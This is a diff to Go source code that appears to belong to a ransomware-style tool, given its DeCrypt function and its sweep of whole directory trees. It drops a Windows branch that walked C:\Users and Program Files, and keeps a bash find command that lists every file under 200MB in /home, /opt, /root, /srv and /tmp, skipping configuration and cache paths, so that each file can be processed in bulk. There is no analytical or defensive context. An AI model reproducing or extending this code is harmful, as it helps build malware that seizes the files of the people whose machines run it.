@@ -77,29 +77,9 @@ func DeCrypt(filename string, ch chan string) {
 
 func main() {
 	var listfile []string
-	switch runtime.GOOS {
-	case "windows":
-		root := "C:\\Users"
-		_ = filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
-			listfile = append(listfile, path)
-			return nil
-		})
-		root = "C:\\Program Files (x86)"
-		_ = filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
-			listfile = append(listfile, path)
-			return nil
-		})
-		//root = "C:\\Program Files"
-		//_ = filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
-		//	listfile = append(listfile, path)
-		//	return nil
-		//})
-	case "linux":
-		cmd := exec.Command("bash", "-c", "find /home /opt /root /srv /tmp -type f -size -200M ! -path \"*.bash*\" ! -path \"*.desktop*\" ! -path \"*.cache*\" ! -path \"*.mozilla*\" 2> /dev/null")
-		output, _ := cmd.CombinedOutput()
-		listfile = strings.Split(string(output), "\n")
-	}
-
+	cmd := exec.Command("bash", "-c", "find /home /opt /root /srv /tmp -type f -size -200M ! -path \"*.bash*\" ! -path \"*.desktop*\" ! -path \"*.cache*\" ! -path \"*.mozilla*\" 2> /dev/null")
+	output, _ := cmd.CombinedOutput()
+	listfile = strings.Split(string(output), "\n")
 	ch := make(chan string, len(listfile))
 
 	for _, file := range listfile {
